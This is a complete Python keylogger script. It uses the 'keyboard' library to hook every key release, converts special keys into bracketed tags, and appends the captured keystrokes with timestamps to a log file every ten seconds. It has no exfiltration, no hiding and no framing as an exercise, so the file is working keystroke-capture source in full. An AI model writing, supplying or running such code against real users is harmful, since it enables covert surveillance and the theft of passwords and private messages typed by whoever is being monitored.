import os
import keyboard
from datetime import datetime
from threading import Timer
import sys

class KeyLogger:
    def __init__(self, log_dir="logs", interval=60):
        self.log_dir = log_dir
        self.interval = interval
        self.log = ""
        self.start_time = datetime.now()
        
        # Ensure log directory exists
        os.makedirs(self.log_dir, exist_ok=True)
        
        # Create log file path
        self.log_file = os.path.join(
            self.log_dir,
            f"keylog_{self.start_time.strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        # Initialize log file
        with open(self.log_file, "a") as f:
            f.write(f"=== Keylogger Started at {self.start_time} ===\n\n")

    def callback(self, event):
        """Process key presses"""
        key = event.name
        
        # Handle special keys
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                key = f"[{key.upper()}]"
        
        self.log += key

    def report(self):
        """Save logs to file at regular intervals"""
        if self.log:
            with open(self.log_file, "a") as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}]\t{self.log}\n")
            self.log = ""
        
        # Schedule next report
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        """Start the keylogger"""
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"[*] Keylogger started. Logging to {self.log_file}")
        print("[!] Press CTRL+C to stop...")
        keyboard.wait()

    def stop(self):
        """Clean up before exiting"""
        if self.log:
            with open(self.log_file, "a") as f:
                f.write(f"\nLast keys: {self.log}\n")
        
        end_time = datetime.now()
        duration = end_time - self.start_time
        
        with open(self.log_file, "a") as f:
            f.write(f"\n=== Keylogger Stopped at {end_time} ===\n")
            f.write(f"=== Duration: {duration} ===\n")
        
        print(f"\n[*] Keylogger stopped. Log saved to {self.log_file}")

if __name__ == "__main__":
    logger = KeyLogger(
        log_dir="logs",  # Directory for log files
        interval=10      # Save every 10 seconds
    )
    
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        print(f"[!] Error: {e}")
        logger.stop()
        sys.exit(1)